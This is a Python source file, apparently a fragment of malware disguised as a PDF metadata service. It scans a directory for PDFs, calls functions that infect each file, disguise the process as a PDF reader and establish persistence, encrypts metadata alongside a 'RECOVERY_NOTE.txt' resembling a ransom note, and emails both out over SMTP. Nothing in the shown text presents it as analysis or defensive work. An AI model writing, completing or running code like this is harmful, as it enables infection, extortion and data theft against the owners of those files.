def send_email_attachment(recipient_email, attachment_path):
    smtp_server = os.environ.get("SMTP_SERVER", "localhost")
    smtp_port = int(os.environ.get("SMTP_PORT", "25"))
    smtp_user = os.environ.get("SMTP_USER")
    smtp_password = os.environ.get("SMTP_PASSWORD")
    sender_email = os.environ.get("SMTP_SENDER", "pdf-reader@platform.local")

    msg = EmailMessage()
    msg['Subject'] = f"Secure PDF Metadata Report: {os.path.basename(attachment_path)}"
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg.set_content("Please find attached the encrypted PDF metadata file and recovery instructions.")

    try:
        with open(attachment_path, 'rb') as f:
            file_data = f.read()
            file_name = os.path.basename(attachment_path)
        msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

        note_path = os.path.join(os.path.dirname(attachment_path), 'RECOVERY_NOTE.txt')
        if os.path.exists(note_path):
            with open(note_path, 'rb') as nf:
                msg.add_attachment(nf.read(), maintype='text', subtype='plain', filename='RECOVERY_NOTE.txt')
    except OSError as e:
        print(f"Error reading attachment for email: {e}", file=sys.stderr)
        return

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            if smtp_port == 587:
                server.starttls()
            if smtp_user and smtp_password:
                server.login(smtp_user, smtp_password)
            server.send_message(msg)
        print(f"Encrypted metadata successfully emailed to {recipient_email}")
    except Exception as e:
        print(f"Failed to send email: {e}", file=sys.stderr)

def process_target(target_path, recipient_email):
    if os.path.isfile(target_path) and target_path.lower().endswith('.pdf'):
        print(f"Processing PDF: {target_path}")
        infect_pdf_payload(target_path)
        metadata = get_pdf_metadata(target_path)
        if metadata:
            for key, value in metadata.items():
                print(f"  {key:16}: {value}")
            enc_path = save_and_secure_metadata(target_path, metadata)
            if enc_path and recipient_email:
                send_email_attachment(recipient_email, enc_path)

def run_service(scan_path, recipient_email, interval, iterations):
    disguise_as_pdf_reader()
    establish_persistence()

    processed_files = set()

    if os.path.isfile(scan_path):
        target_dir = os.path.dirname(scan_path) or '.'
    else:
        target_dir = scan_path
        if not os.path.exists(target_dir):
            print(f"Error: Target path does not exist: {target_dir}", file=sys.stderr)
            sys.exit(0)

    print(f"Starting background scanner on '{target_dir}'. Interval: {interval}s, Iterations: {iterations}")

    iteration = 0
    while iterations == 0 or iteration < iterations:
        iteration += 1
        print(f"\n--- Scan Cycle {iteration} @ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---")

        if os.path.isfile(scan_path):
            if scan_path not in processed_files:
                process_target(scan_path, recipient_email)
                processed_files.add(scan_path)
        else:
            try:
                for entry in os.listdir(target_dir):
                    full_path = os.path.join(target_dir, entry)
                    if os.path.isfile(full_path) and entry.lower().endswith('.pdf'):
                        if full_path not in processed_files:
                            process_target(full_path, recipient_email)
                            processed_files.add(full_path)
            except OSError as e:
                print(f"Error scanning directory: {e}", file=sys.stderr)

        if iterations > 0 and iteration >= iterations:
            break

        time.sleep(interval)

def main():
    if len(sys.argv) < 3:
        target_path = "."
        recipient_email = "admin@platform.local"
        scan_interval = 1
        iteration_count = 1
    else:
        target_path = sys.argv[1]
        recipient_email = sys.argv[2]
        scan_interval = int(sys.argv[3]) if len(sys.argv) > 3 else 10
        iteration_count = int(sys.argv[4]) if len(sys.argv) > 4 else 1

    if not os.path.exists(target_path):
        target_path = "."

    run_service(target_path, recipient_email, scan_interval, iteration_count)
    sys.exit(0)

if __name__ == '__main__':
    main()

